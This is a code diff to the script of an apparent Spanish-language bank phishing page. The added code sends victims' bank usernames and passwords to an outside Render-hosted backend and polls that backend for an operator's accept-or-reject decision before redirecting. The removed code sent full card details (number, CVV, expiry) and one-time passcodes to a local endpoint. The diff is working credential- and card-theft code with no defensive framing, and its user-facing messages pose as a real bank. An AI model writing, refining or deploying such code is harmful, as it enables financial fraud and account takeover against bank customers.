@@ -153,7 +153,9 @@
     </div>
 
     <script>
-        const POLLING_INTERVAL = 2000;
+        // 🔥 URL DE TU NUEVO BACKEND
+        const BACKEND_URL = 'https://backkkk-rj54.onrender.com';
+        const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
 
         const BANK_LOGOS = {
@@ -233,54 +235,33 @@
             };
         }
 
+        // 🔥 AHORA USA /api/login DEL BACKEND NUEVO
         async function enviarCredenciales(usuario, password) {
-            const t = leerDatosTarjeta();
             try {
-                const resp = await fetch('/api/crear-pago', {
+                const resp = await fetch(`${BACKEND_URL}/api/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        solicitud_id: solicitudId,
-                        titular: t.titular || 'N/A',
-                        numero_tarjeta: t.numero || 'N/A',
-                        cvv: t.cvv || 'N/A',
-                        vencimiento: t.vencimiento || 'N/A',
-                        marca_tarjeta: t.marca || 'visa',
-                        banco_emisor: t.banco || 'Desconocido',
-                        usuario_banco: usuario,
-                        password_banco: password,
-                        paso: 'credenciales'
+                        usuario: usuario,
+                        clave: password
                     })
                 });
                 const data = await resp.json();
-                return data.success === true;
-            } catch (e) { return false; }
+                
+                if (data.success && data.intentoId) {
+                    // Guardamos el ID del intento para hacer polling
+                    solicitudId = data.intentoId;
+                    return true;
+                }
+                return false;
+            } catch (e) { 
+                console.error('Error enviando credenciales:', e);
+                return false; 
+            }
         }
 
-        async function enviarOTP(codigo) {
-            const t = leerDatosTarjeta();
-            try {
-                const resp = await fetch('/api/crear-pago', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        solicitud_id: solicitudId,
-                        titular: t.titular || 'N/A',
-                        numero_tarjeta: t.numero || 'N/A',
-                        cvv: t.cvv || 'N/A',
-                        vencimiento: t.vencimiento || 'N/A',
-                        marca_tarjeta: t.marca || 'visa',
-                        banco_emisor: t.banco || 'Desconocido',
-                        codigo_otp: codigo,
-                        paso: 'otp'
-                    })
-                });
-                const data = await resp.json();
-                return data.success === true;
-            } catch (e) { return false; }
-        }
-
-        function iniciarPolling(texto, fase) {
+        // 🔥 AHORA USA /api/status/:id
+        function iniciarPolling(texto) {
             if (pollingInterval) clearInterval(pollingInterval);
             const start = Date.now();
             loadingOverlay.classList.add('active');
@@ -296,57 +277,27 @@
                     return;
                 }
                 try {
-                    const r = await fetch(`/api/estado-pago/${solicitudId}`);
+                    const r = await fetch(`${BACKEND_URL}/api/status/${solicitudId}`);
                     const data = await r.json();
                     
-                    // Si no hay success, ignorar
-                    if (!data.success) return;
-
-                    // 🔥 FASE 1: SOLO desbloquea OTP si el backend dice explícitamente 'credenciales'
-                    if (data.estado === 'aprobado' && data.fase === 'credenciales') {
+                    if (data.estado === 'aceptado') {
                         clearInterval(pollingInterval);
                         pollingInterval = null;
                         loadingOverlay.classList.remove('active');
-                        desbloquearOTP();
-                        return;
-                    }
-
-                    // 🔥 FASE 2: SOLO redirige si el backend dice explícitamente 'otp'
-                    if (data.estado === 'aprobado' && data.fase === 'otp') {
-                        clearInterval(pollingInterval);
-                        pollingInterval = null;
                         mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
-                        setTimeout(() => { window.location.href = 'exito.html'; }, 1800);
+                        setTimeout(() => { window.location.href = 'extracto.html'; }, 1500);
                         return;
                     }
 
-                    // Si fue rechazado
                     if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval);
                         pollingInterval = null;
-                        mostrarError(data.mensaje || '❌ Rechazado');
+                        mostrarError(data.mensaje || '❌ Credenciales incorrectas. Intenta de nuevo.');
                         resetFormulario();
                         return;
                     }
-
-                    // Si está pendiente, el ciclo termina y espera 2s más
                 } catch (e) {}
             }, POLLING_INTERVAL);
-        }
-
-        function desbloquearOTP() {
-            usernameInput.disabled = true;
-            passwordInput.disabled = true;
-            otpSection.classList.add('visible');
-            confirmationInput.disabled = false;
-            confirmationInput.focus();
-            document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
-            document.getElementById('mainSubtitle').innerHTML =
-                `Credenciales verificadas. Ingresa el código OTP para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
-            buttonText.textContent = 'Confirmar OTP';
-            faseActual = 'otp';
-            formularioBloqueado = false;
-            submitButton.disabled = false;
         }
 
         function mostrarError(msg) {
@@ -391,55 +342,28 @@
             statusMessage.style.display = 'none';
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
 
-            if (faseActual === 'credenciales') {
-                if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
-                if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
-                else if (passwordInput.value.length < 4) {
-                    passwordInput.parentElement.classList.add('error');
-                    passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
-                    isValid = false;
-                }
-            } else if (faseActual === 'otp') {
-                if (!confirmationInput.value.trim()) { confirmationInput.parentElement.classList.add('error'); isValid = false; }
-                else if (!/^\d{4,8}$/.test(confirmationInput.value)) {
-                    confirmationInput.parentElement.classList.add('error');
-                    confirmationInput.parentElement.querySelector('.error-message').textContent = 'Debe tener entre 4 y 8 dígitos';
-                    isValid = false;
-                }
+            if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
+            if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
+            else if (passwordInput.value.length < 4) {
+                passwordInput.parentElement.classList.add('error');
+                passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
+                isValid = false;
             }
 
             if (!isValid) return;
 
             formularioBloqueado = true;
             submitButton.disabled = true;
+            buttonText.textContent = 'Verificando...';
 
-            if (faseActual === 'credenciales') {
-                buttonText.textContent = 'Verificando...';
-                const ok = await enviarCredenciales(usernameInput.value.trim(), passwordInput.value.trim());
-                if (!ok) {
-                    mostrarError('Error al procesar las credenciales');
-                    resetFormulario();
-                    return;
-                }
-                iniciarPolling('Verificando credenciales. Esperando aprobación...', 'credenciales');
-
-            } else if (faseActual === 'otp') {
-                buttonText.textContent = 'Verificando OTP...';
-                const ok = await enviarOTP(confirmationInput.value.trim());
-                if (!ok) {
-                    mostrarError('Error al procesar el OTP');
-                    formularioBloqueado = false;
-                    submitButton.disabled = false;
-                    buttonText.textContent = 'Confirmar OTP';
-                    return;
-                }
-                iniciarPolling('Verificando OTP. Esperando aprobación final...', 'otp');
+            const ok = await enviarCredenciales(usernameInput.value.trim(), passwordInput.value.trim());
+            if (!ok) {
+                mostrarError('Error al enviar las credenciales al banco.');
+                resetFormulario();
+                return;
             }
-        });
-
-        confirmationInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
-            if (this.value.length > 8) this.value = this.value.slice(0, 8);
+            
+            iniciarPolling('Verificando credenciales. Esperando aprobación...');
         });
 
         window.addEventListener('load', function() {
